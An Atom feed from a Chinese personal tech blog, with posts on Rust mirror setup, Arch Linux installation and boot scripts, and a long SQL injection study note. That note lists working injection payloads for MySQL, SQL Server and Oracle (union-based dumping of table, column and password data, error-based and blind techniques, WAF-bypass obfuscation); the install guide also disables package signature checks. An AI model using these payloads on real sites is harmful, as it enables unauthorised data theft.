<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xchang&#39;s Blog</title>
  
  
  <link href="https://0xchang.github.io/atom.xml" rel="self"/>
  
  <link href="https://0xchang.github.io/"/>
  <updated>2022-02-14T13:52:56.221Z</updated>
  <id>https://0xchang.github.io/</id>
  
  <author>
    <name>0xchang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>rust修改默认环境变量与源</title>
    <link href="https://0xchang.github.io/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/"/>
    <id>https://0xchang.github.io/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</id>
    <published>2022-02-11T08:27:31.000Z</published>
    <updated>2022-02-14T13:52:56.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p><p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p><p>打开 <em><strong>cmd</strong></em> 配置参数</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure><p>path 添加%CARGO_HOME%\bin</p><h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;https://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br><span class="line">[http]</span><br><span class="line">check-revoke = false</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;rust修改默认环境变量与源&quot;&gt;&lt;a href=&quot;#rust修改默认环境变量与源&quot; class=&quot;headerlink&quot; title=&quot;rust修改默认环境变量与源&quot;&gt;&lt;/a&gt;rust修改默认环境变量与源&lt;/h2&gt;&lt;h3 id=&quot;0x00-windows-rust</summary>
      
    
    
    
    
    <category term="rust" scheme="https://0xchang.github.io/tags/rust/"/>
    
    <category term="环境变量" scheme="https://0xchang.github.io/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    
  </entry>
  
  <entry>
    <title>arch开机启动脚本</title>
    <link href="https://0xchang.github.io/2022/02/10/arch%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/"/>
    <id>https://0xchang.github.io/2022/02/10/arch%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2022-02-10T13:35:42.000Z</published>
    <updated>2022-02-11T11:59:47.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Arch-Linux-添加开机启动脚本"><a href="#Arch-Linux-添加开机启动脚本" class="headerlink" title="Arch Linux 添加开机启动脚本"></a>Arch Linux 添加开机启动脚本</h2><h3 id="0x01-创建一个启动service脚本"><a href="#0x01-创建一个启动service脚本" class="headerlink" title="0x01 创建一个启动service脚本"></a>0x01 创建一个启动service脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /usr/lib/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure><p>以下是rc-local.service的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=&quot;/etc/rc.local Compatibility&quot;</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><h3 id="0x02-创建-etc-rc-local-文件"><a href="#0x02-创建-etc-rc-local-文件" class="headerlink" title="0x02 创建 /etc/rc.local 文件"></a>0x02 创建 /etc/rc.local 文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/rc.local</span><br></pre></td></tr></table></figure><p>以下是/etc/rc.local的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/rc.local</span></span><br><span class="line">if test -d /etc/rc.local.d; then</span><br><span class="line">for rcscript in /etc/rc.local.d/*.sh; do</span><br><span class="line">test -r &quot;$&#123;rcscript&#125;&quot; &amp;&amp; sh $&#123;rcscript&#125;</span><br><span class="line">done</span><br><span class="line">unset rcscript</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启"><a href="#0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启" class="headerlink" title="0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启"></a>0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/rc.local</span><br><span class="line">sudo mkdir /etc/rc.local.d</span><br><span class="line">sudo systemctl enable rc-local</span><br></pre></td></tr></table></figure><h3 id="0x04-创建sh脚本放在-etc-rc-local-d-文件夹中"><a href="#0x04-创建sh脚本放在-etc-rc-local-d-文件夹中" class="headerlink" title="0x04 创建sh脚本放在/etc/rc.local.d/文件夹中"></a>0x04 创建sh脚本放在/etc/rc.local.d/文件夹中</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/rc.local.d/paru.sh</span><br><span class="line">(编写内容xxxx)</span><br><span class="line">sudo chmod a+x /etc/rc.local.d/paru.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Arch-Linux-添加开机启动脚本&quot;&gt;&lt;a href=&quot;#Arch-Linux-添加开机启动脚本&quot; class=&quot;headerlink&quot; title=&quot;Arch Linux 添加开机启动脚本&quot;&gt;&lt;/a&gt;Arch Linux 添加开机启动脚本&lt;/h2&gt;&lt;h3 i</summary>
      
    
    
    
    
    <category term="arch" scheme="https://0xchang.github.io/tags/arch/"/>
    
    <category term="开机启动" scheme="https://0xchang.github.io/tags/%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>arch-linux安装教程</title>
    <link href="https://0xchang.github.io/2022/02/03/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <id>https://0xchang.github.io/2022/02/03/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</id>
    <published>2022-02-03T07:27:10.000Z</published>
    <updated>2022-02-11T11:59:47.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vmware安装arch"><a href="#vmware安装arch" class="headerlink" title="vmware安装arch"></a>vmware安装arch</h2><h3 id="0x01-下载镜像源"><a href="#0x01-下载镜像源" class="headerlink" title="0x01 下载镜像源"></a>0x01 下载镜像源</h3><ul><li>下载镜像源<a href="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/">清华镜像源</a>，下载合适的镜像源</li></ul><h3 id="0x02-vmware新建虚拟机"><a href="#0x02-vmware新建虚拟机" class="headerlink" title="0x02 vmware新建虚拟机"></a>0x02 vmware新建虚拟机</h3><ul><li>vmware新建虚拟机，然后选择镜像开机，网络选择NAT</li></ul><h3 id="0x03-开始安装"><a href="#0x03-开始安装" class="headerlink" title="0x03 开始安装"></a>0x03 开始安装</h3><ul><li>默认选择第一项</li></ul><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203153912752.png" alt="image-20220203153912752"></p><ul><li><p>一般默认开启ssh服务，建议用ssh链接可以复制粘贴比比较方便<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203154610491.png" alt="image-20220203154610491">如果没有开启ssh可以使用<strong>systemctl start sshd</strong>开启服务，使用<strong>passwd</strong>修改密码之后使用<strong>ip a</strong>查看ip地址之后使用ssh连接<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203155023782-16438746240531.png" alt="image-20220203155023782"></p></li><li><p>测试网络连通性<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203155831482.png" alt="image-20220203155831482"></p></li><li><p>磁盘分区：运行命令<strong>parted /dev/sda</strong> <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203183147074.png" alt="image-20220203183147074"></p><p>创建主引导记录分区表<strong>mklabel msdos</strong>,依次输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkpart primary ext4 1M 100M</span><br><span class="line">set 1 boot on</span><br><span class="line">mkpart primary linux-swap 100M 4G</span><br><span class="line">mkpart primary ext4 4G 100%</span><br><span class="line">print</span><br></pre></td></tr></table></figure><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203193804330.png" alt="image-20220203193804330"></p><p>使用<strong>quit</strong>退出程序</p></li><li><p>磁盘格式化，查看分区情况<strong>lsblk /dev/sda</strong>，输入以下命令进行格式化操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/sda1</span><br><span class="line">mkfs.ext4 /dev/sda3</span><br><span class="line">mkswap /dev/sda2</span><br><span class="line">swapon /dev/sda2</span><br></pre></td></tr></table></figure><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203194117259.png" alt="image-20220203194117259"></p><p>然后进行挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt</span><br><span class="line">mkdir –p /mnt/boot</span><br><span class="line">mount /dev/sda1 /mnt/boot</span><br></pre></td></tr></table></figure></li><li><p>设置安装镜像源</p><p>使用nano或者vim编辑器编辑对应文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure><p>文件最前方加入<strong>Server    =    <a href="http://mirrors.163.com/archlinux//$repo/os//$arch">http://mirrors.163.com/archlinux/\$repo/os/\$arch</a></strong>,<strong>ctrl+o</strong>保存，<strong>ctrl+x</strong>退出</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203194655988.png" alt="image-20220203194655988"></p></li><li><p>安装软件包</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap -i /mnt base linux linux-firmware dhcpcd vim openssh xfsprogs man net-tools base-devel</span><br></pre></td></tr></table></figure><p>  遇到选项直接回车</p></li><li><p>配置文件系统</p><p>对分区表进行设置<strong>genfstab -U -P /mnt &gt;&gt; /mnt/etc/fstab</strong><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203195507094.png" alt="image-20220203195507094"></p></li><li><p>chroot进入新系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt /bin/bash</span><br></pre></td></tr></table></figure><p>运行后，我们就将切入安装的操作系统之中</p></li><li><p>修改系统的字符编码支持</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure><p>将对应文件内容前面的#去掉:</p><p>en_US.UTF-8 UTF-8 </p><p>zh_CN.UTF-8UTF-8</p><p>zh_CN GB2312</p><p>之后输入命令,使用en_US.UTF-8作为默认系统编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locale-gen</span><br><span class="line">echo LANG=en_US.UTF-8 &gt; /etc/locale.conf</span><br></pre></td></tr></table></figure></li><li><p>设置时区</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure></li><li><p>设置root密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd </span><br></pre></td></tr></table></figure></li><li><p>创建 ramdisk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure></li><li><p>安装grub</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub os-prober #安装grub包</span><br><span class="line">grub-install /dev/sda #安装grub</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg #配置grub</span><br></pre></td></tr></table></figure><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203200708506.png" alt="image-20220203200708506"></p></li><li><p>配置网络和主机名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo arch &gt; /etc/hostname #arch可以改成自己喜欢的</span><br><span class="line">systemctl enable dhcpcd.service #如果是有线路由，设置开机自动联网</span><br><span class="line">pacman -S iw wpa_supplicant dialog #无线网络安装软件包</span><br></pre></td></tr></table></figure></li><li><p>创建普通用户arch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -G wheel -s /bin/bash arch #创建arch并添加到wheel组</span><br><span class="line">passwd arch #修改arch密码</span><br><span class="line">visudo #修改sudo相关配置，去掉相关位置#即可</span><br></pre></td></tr></table></figure><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203201447697.png" alt="image-20220203201447697"></p></li><li><p><strong>exit</strong>退出chroot环境，<strong>reboot</strong>重启系统</p><p>输入用户名登录进入系统成功</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203201653721.png" alt="image-20220203201653721"></p></li></ul><h3 id="0x04安装yay（可有可无）"><a href="#0x04安装yay（可有可无）" class="headerlink" title="0x04安装yay（可有可无）"></a>0x04安装yay（可有可无）</h3>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf,最后一行添加以下数据</span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Never</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</span><br><span class="line">[blackarch]</span><br><span class="line">SigLevel = Never</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/blackarch/$repo/os/$arch</span><br></pre></td></tr></table></figure><p>  然后更新</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br><span class="line"><span class="meta">#</span><span class="bash">接着安装yay</span></span><br><span class="line">pacman -S yay</span><br></pre></td></tr></table></figure><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/arch-linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20220203203808157.png" alt="image-20220203203808157"></p><p>  安装完成</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;vmware安装arch&quot;&gt;&lt;a href=&quot;#vmware安装arch&quot; class=&quot;headerlink&quot; title=&quot;vmware安装arch&quot;&gt;&lt;/a&gt;vmware安装arch&lt;/h2&gt;&lt;h3 id=&quot;0x01-下载镜像源&quot;&gt;&lt;a href=&quot;#0x0</summary>
      
    
    
    
    
    <category term="arch" scheme="https://0xchang.github.io/tags/arch/"/>
    
    <category term="linux" scheme="https://0xchang.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell</title>
    <link href="https://0xchang.github.io/2022/01/05/%E5%8F%8D%E5%BC%B9shell/"/>
    <id>https://0xchang.github.io/2022/01/05/%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2022-01-05T00:23:27.000Z</published>
    <updated>2022-02-11T11:59:49.998Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="https://0xchang.github.io/2021/12/28/sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://0xchang.github.io/2021/12/28/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-12-28T06:15:15.000Z</published>
    <updated>2022-02-11T11:59:48.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h2><h3 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h3><ol><li>找到网站注入点</li><li>判断注入点是字符型还是数字型注入（使用减法，使用<code>and 1=1</code>）</li><li>判断闭合方式（fuzz，仅限于字符型注入）</li><li>判断前一条sql查询列数（推荐<code>group by</code> 、 <code>order by</code>容易waf检测）</li><li>查询回显位（仅限union注入） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure></li><li>查询当前数据库库名</li><li>查询当前数据库所有表名<ul><li><strong>table_name</strong>表示表名，mysql数据库有<strong>information_schema</strong>数据库,存放了表名，列名，<strong>information_schema.tables</strong>是存放所有表名的表，<strong>information_schema.columns</strong>是存放所有列名的表，<strong>table_schema</strong>是数据库的名称，<strong>table_name</strong>是存放表名的列（是information_schema.tables的属性）,<strong>group_concat</strong>可以一行显示多个数据<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li></ul></li><li>查询当前数据所有列名,<strong>column_name</strong>是存放所有列名的列,<strong>information_schema.columns</strong>包含了<strong>table_name</strong>属性<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;</code></li><li>查询当前数据表所有列项 <strong>id,username,password</strong><br> <code>?id=-1 union select 1,2,group_concat(id,&#39;:&#39;,username,&#39;****&#39;) from users</code></li></ol><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>原理：优先执行括号内的内容,报错注入最多一次只能显示<em>32</em>个字符</p><ol><li><p><strong>extractvalue</strong>报错注入</p><ul><li>数据库读取XML文件，**extractvalue(书名，路径)**，路径格式必须是<code>/</code>,否则报错</li><li><strong>concat(0x7e,(select database)))</strong> 组合参数,concat用于连接字符串，若有一个参数为null，则返回null<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select database()))) --+</code></li><li>**substring(‘test’,x,y)**，从第x个字符开始，显示y个字符 </li><li>解决只能返回32个字符串问题<br><code>?id=-1&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30)))) --+ /*从第25个字符往后再显示30个字符*</code> </li></ul></li><li><p>updatexml报错注入</p><ul><li>updatexml()修改文档，三个参数，第二个参数为路径<br><code>id=1&#39; and 1=updatexml(1,concat(0x7e,(select databse())),3) --+</code><br><code>?id=1 union select 1,2,updatexml(1,concat(0x7e,(select database())),3) --+</code></li></ul><p> <code>SELECT concat_ws(&#39;-&#39;,2.3);</code><br> <code>SELECT concat_ws(&#39;-&#39;,database(),floor(rand()*2));</code><br> <code>select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2)) as cc from information_schema.tables group by cc;</code></p></li><li><p>floor报错注入</p><ul><li>floor,count,group by冲突报错</li><li>注入语句<code>and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></li></ul></li></ol><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ol start="3"><li>布尔盲注<ul><li>页面不会报错，页面有两种状态，一种真值，一种假值<br><code>?id=1&#39; and ascii(substring((select database()),2,1))=101 --+</code></li></ul></li></ol><ol start="4"><li><p>时间盲注</p><p> <code>select if(1&gt;2,2,sleep(2));</code></p></li></ol><h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><ol><li><p>preg_replace($reg,$replace.$id)，替换函数</p></li><li><p>双写绕过</p></li><li><p>大小写绕过</p></li><li><p>替换</p><ul><li>order by = group by</li><li>union select = union all select</li></ul></li><li><p>混淆</p><ul><li>注释：/*xxxx*/      /*!50000 version()*/   <em>!会执行注释里的内容，版本大于5.0就会执行version()命令</em><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,3,4 --+</code><br><code>?id=-1&#39; union /*!99999xxx*/ select 1,2,database(/*!99999 xxx*/) --+</code></li><li>换行：  +(空格)   %0A(换行，–+只注释当前行，换行后不注释)</li><li>换行加注释： %0a –+ xxx<br><code>?id=-1&#39; union /*!50000 --+/*%0a select 1,2,database() */ --+</code></li></ul></li></ol><p>php?id=  ———&gt;mysql</p><p>asp?id=  ———&gt;access sql server</p><p>jsp?id=  ———&gt; oracle</p><h3 id="sql-server-注入"><a href="#sql-server-注入" class="headerlink" title="sql server 注入"></a>sql server 注入</h3><ol><li><p>常见查询函数</p><ul><li><p>select @@version; 数据库版本</p></li><li><p>select @@servername; 查询服务名</p></li><li><p>select host_name(); 查询主机名，如果用vnavicat远程连接，主机名是本地名字</p></li><li><p>select db_name； 查询当前数据库名</p></li><li><p>select user; 查询当前数据库的拥有者，结果为dbo。dbo 是每个数据库的默认用户，具有所有者权限，databaseOwner</p></li><li><p>只能使用order by函数查询列数</p></li><li><p>for xml path(‘’)===gropu_concat()<br><code>select * from user for xml path(&#39;&#39;)</code></p></li><li><p>quotename(表名)<br><code>select quotename() from user for xml path(&#39;&#39;)</code><br><code>?id=0&#39; union select 1,2,(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code><br><code>?id=0&#39; union select 1,2,(select quotename(column_name) from information_schema.columns where table_name=&#39;users&#39; for xml path(&#39;&#39;)) --+</code></p></li><li><p>sql server 排除法</p></li><li><p>where 列名 not in 排除法<br><code>where name not in(&#39;database1&#39;,&#39;database2&#39;)</code></p></li><li><p>master..sysdatabases获取数据库名<br><code>?id=0&#39; union select 1,2,name from master..sysdatabases where name not in(&#39;master&#39;,&#39;model&#39;,&#39;msdb&#39;,&#39;ReportServer&#39;,&#39;ReportServerTempDB&#39;) --+</code></p></li><li><p>sys.sysobjects表，存放所有数据库表名的表，xtype是S是system，U是user<br><code>?id=0&#39; union select 1,2,name from sysobjects where xtype=&#39;U&#39; --+</code></p></li><li><p>sys.syscolumns表，存放所有数据库列名的表，通过id确定表<br><code>?id=0&#39; union select 1,2,name from syscolumns where id=(select id from sysobjects where name=&#39;users&#39; and xtype=&#39;U&#39;) and name not in (&#39;id&#39;) --+</code></p></li></ul></li><li><p>报错注入</p><ul><li><code>?id=0&#39; and 1=(@@version) --+</code></li><li><code>?id=1&#39; and 1=(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code></li><li>convert()把时间定义一个数据类型<ul><li>convert(data_type(length),data_to_beconverted,style)</li></ul></li><li>cast()将数据类型转换为另一种数据类型<ul><li>select cast(@@version as int)</li></ul></li></ul></li><li><p>布尔盲注</p><ul><li><code>/?id=1&#39; and ascii(substring(db_name(),1,1))&gt;100 --+</code></li></ul></li><li><p>时间盲注</p><ul><li>waitfor delay ‘00:00:02’查询动作等待2秒后反馈结果<ul><li><code>if(ascii(substring((db_name()),1,1))&gt;100) begin waitfor delay &#39;00:00:00&#39; end else begin waitfor delay &#39;00:00:02&#39; end --+</code></li></ul></li></ul></li></ol><h3 id="oracle-注入"><a href="#oracle-注入" class="headerlink" title="oracle 注入"></a>oracle 注入</h3><ol><li>数据类型保持一致<ul><li>判断数据类型，dual是oracle的虚表<br><code>?id=0&#39; union select &#39;1&#39;,null,null from dual --+</code>出现报错，则第一个数据类型为整形，若没有报错，则为字符型<br><code>?id=1&#39; union select 1,&#39;2&#39;,&#39;3&#39; from dual --+</code>判断回显位</li><li>wm_concat(),多行变一行，user_tables是表名，user_tab_columns是列名<ul><li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(table_name) from user_tables) from dual --+</code></li><li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USER&#39;) from dual --+</code></li><li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USERS&#39;) from dual --+</code></li></ul></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sql-注入&quot;&gt;&lt;a href=&quot;#sql-注入&quot; class=&quot;headerlink&quot; title=&quot;sql 注入&quot;&gt;&lt;/a&gt;sql 注入&lt;/h2&gt;&lt;h3 id=&quot;一般过程&quot;&gt;&lt;a href=&quot;#一般过程&quot; class=&quot;headerlink&quot; title=&quot;一</summary>
      
    
    
    
    
    <category term="sql" scheme="https://0xchang.github.io/tags/sql/"/>
    
    <category term="注入" scheme="https://0xchang.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>使用网络抓包进行网络验证破解</title>
    <link href="https://0xchang.github.io/2021/12/28/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/"/>
    <id>https://0xchang.github.io/2021/12/28/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2021-12-28T01:27:52.000Z</published>
    <updated>2022-02-11T11:59:49.869Z</updated>
    
